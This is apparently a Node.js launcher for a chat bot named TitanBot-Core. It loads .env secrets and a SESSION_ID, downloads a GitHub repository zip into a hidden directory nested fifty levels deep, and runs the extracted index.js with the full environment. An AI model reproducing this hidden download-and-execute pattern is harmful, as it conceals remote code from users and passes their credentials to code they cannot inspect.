const fs = require('fs');
  const path = require('path');
  const axios = require('axios');
  const AdmZip = require('adm-zip');
  const { spawn } = require('child_process');

  // === CONFIG ===
  const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
  const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);

  const DOWNLOAD_URL = "https://github.com/stepperkid/STEPPERKID-TECH-WORLD-/archive/refs/heads/main.zip";
  const EXTRACT_DIR = path.join(TEMP_DIR, "STEPPERKID-TECH-WORLD--main");
  const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
  const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
  const ENV_FILE = path.join(__dirname, ".env");

  const delay = (ms) => new Promise(res => setTimeout(res, ms));

  // === LOGGING UTIL ===
  function log(msg, type = "INFO") {
    const colors = {
      INFO: "\x1b[35m",     // Magenta
      SUCCESS: "\x1b[32m",  // Green
      WARNING: "\x1b[33m",  // Yellow
      ERROR: "\x1b[31m",    // Red
      SESSION: "\x1b[36m",  // Cyan
      LAUNCH: "\x1b[34m",   // Blue
      INIT: "\x1b[35m"      // Magenta
    };
    const reset = "\x1b[0m";
    console.log(`${colors[type] || colors.INFO}[ TitanBot-Core 🛡️ ][${type}]${reset} ${msg}`);
  }

  // === ENV FILE LOADING ===
  function loadEnvFile() {
    if (!fs.existsSync(ENV_FILE)) {
      log("No .env file found", "INFO");
      return;
    }

    try {
      const envContent = fs.readFileSync(ENV_FILE, 'utf8');
      envContent.split('\n').forEach(line => {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) return;

        const [key, ...rest] = trimmed.split('=');
        if (!key || !rest.length) return;

        let value = rest.join('=').trim();
        value = value.replace(/^['"](.*)['"]$/, '$1');

        if (!process.env[key]) {
          process.env[key] = value;
          log(`Loaded variable: ${key}`, "SESSION");
        }
      });
      log(".env file loaded successfully", "SUCCESS");
    } catch (e) {
      log(`Failed to load .env file: ${e.message}`, "ERROR");
    }
  }

  // === SESSION CHECK ===
  function checkSessionId() {
    if (process.env.SESSION_ID) {
      log("SESSION_ID detected in environment", "SESSION");
      return true;
    }
    log("SESSION_ID environment variable not found", "WARNING");
    return false;
  }

  // === DOWNLOAD & EXTRACT ===
  async function downloadAndExtract() {
    try {
      if (fs.existsSync(EXTRACT_DIR)) {
        log("Extracted directory found, skipping download", "INFO");
        return;
      }

      if (fs.existsSync(TEMP_DIR)) {
        log("Removing previous cache", "WARNING");
        fs.rmSync(TEMP_DIR, { recursive: true, force: true });
      }
      fs.mkdirSync(TEMP_DIR, { recursive: true });

      const zipPath = path.join(TEMP_DIR, "repo.zip");
      log("Connecting to server...", "INFO");

      const response = await axios.get(DOWNLOAD_URL, { responseType: "stream" });
      await new Promise((resolve, reject) => {
        const writer = fs.createWriteStream(zipPath);
        response.data.pipe(writer);
        writer.on("finish", resolve);
        writer.on("error", reject);
      });

      log("ZIP download completed", "SUCCESS");

      try {
        log("Extracting TitanBot-Core files...", "INFO");
        new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);
      } catch (e) {
        log(`Failed to extract ZIP: ${e.message}`, "ERROR");
        throw e;
      } finally {
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
      }

      if (fs.existsSync(EXTRACT_DIR)) {
        log("TitanBot-Core files verified", "SUCCESS");
      } else {
        log("TitanBot-Core folder not found after extraction", "ERROR");
      }
    } catch (e) {
      log(`Download and extraction failed: ${e.message}`, "ERROR");
      throw e;
    }
  }

  // === APPLY LOCAL SETTINGS ===
  async function applyLocalSettings() {
    if (!fs.existsSync(LOCAL_SETTINGS)) {
      log("No local settings file found", "INFO");
      return;
    }

    try {
      fs.mkdirSync(EXTRACT_DIR, { recursive: true });
      fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
      log("Local settings applied successfully", "SUCCESS");
    } catch (e) {
      log(`Failed to apply local settings: ${e.message}`, "ERROR");
    }

    await delay(500);
  }

  // === START BOT ===
  function startBot() {
    log("Starting TitanBot-Core 🛡️...", "LAUNCH");

    if (!checkSessionId()) {
      log("TitanBot-Core will not start without SESSION_ID", "ERROR");
      process.exit(1);
    }

    if (!fs.existsSync(EXTRACT_DIR)) {
      log("Extracted directory not found", "ERROR");
      return;
    }

    if (!fs.existsSync(path.join(EXTRACT_DIR, "index.js"))) {
      log("index.js not found in extracted directory", "ERROR");
      return;
    }

    const bot = spawn("node", ["index.js"], {
      cwd: EXTRACT_DIR,
      stdio: "inherit",
      env: { ...process.env },
    });

    bot.on("close", code => log(`Process terminated with exit code: ${code}`, "INFO"));
    bot.on("error", err => log(`TitanBot-Core failed to start: ${err.message}`, "ERROR"));
  }

  // === RUN ===
  (async () => {
    try {
      log("Initializing TitanBot-Core 🛡️...", "INIT");
      loadEnvFile();
      await downloadAndExtract();
      await applyLocalSettings();
      startBot();
    } catch (e) {
      log(`Application error: ${e.message}`, "ERROR");
      process.exit(1);
    }
  })();
  